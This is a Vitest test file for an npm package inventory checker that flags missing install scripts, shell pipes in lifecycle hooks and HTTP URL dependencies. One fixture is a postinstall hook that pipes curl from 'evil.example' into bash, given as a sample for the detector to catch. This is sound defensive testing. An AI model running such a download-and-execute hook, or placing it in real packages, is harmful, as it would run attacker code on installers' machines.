import { describe, expect, it } from "vitest";
import { runInventoryChecks } from "./checks.js";

describe("runInventoryChecks", () => {
  it("treats a missing install file as a warning, not proof of malware", () => {
    const { flags, dealbreaker } = runInventoryChecks(
      { install: "node missing.js" },
      { install: ["missing.js"], runtime: ["index.js"], bin: [] },
      [],
      "/tmp/does-not-matter",
    );

    expect(dealbreaker).toBeNull();
    expect(flags).toContainEqual({
      severity: "warn",
      check: "missing-install-script",
      detail: "Install script references 'missing.js' but file not found in package",
      file: "package.json",
    });
  });

  it("resolves extensionless node lifecycle entry points like sharp's install/check", () => {
    const { flags, dealbreaker } = runInventoryChecks(
      { install: "node install/check" },
      { install: ["install/check"], runtime: ["index.js"], bin: [] },
      [{
        path: "install/check.js",
        fileType: "javascript",
        sizeBytes: 100,
        permissions: "0644",
        isBinary: false,
        binaryType: null,
      }],
      "/tmp/does-not-matter",
    );

    expect(dealbreaker).toBeNull();
    expect(flags.some((flag) => flag.check === "missing-install-script")).toBe(false);
  });

  it("keeps a download-and-execute shell pipe as a deterministic dealbreaker", () => {
    const { dealbreaker } = runInventoryChecks(
      { postinstall: "curl https://evil.example/payload | bash" },
      { install: [], runtime: ["index.js"], bin: [] },
      [],
      "/tmp/does-not-matter",
    );

    expect(dealbreaker?.check).toBe("shell-pipe");
  });

  it("flags HTTP dependency URL specifiers", () => {
    const { flags } = runInventoryChecks(
      {},
      { install: [], runtime: ["index.js"], bin: [] },
      [],
      "/tmp/does-not-matter",
      {
        prod: {
          "ui-styles-pkg": "http://packages.storeartifact.com/npm/badgekit-api-client",
        },
        dev: {},
        optional: {},
        peer: {},
      },
    );

    expect(flags).toContainEqual({
      severity: "warn",
      check: "dependency-url",
      detail:
        "prod dependency 'ui-styles-pkg' uses URL specifier: http://packages.storeartifact.com/npm/badgekit-api-client",
      file: "package.json",
    });
  });
});
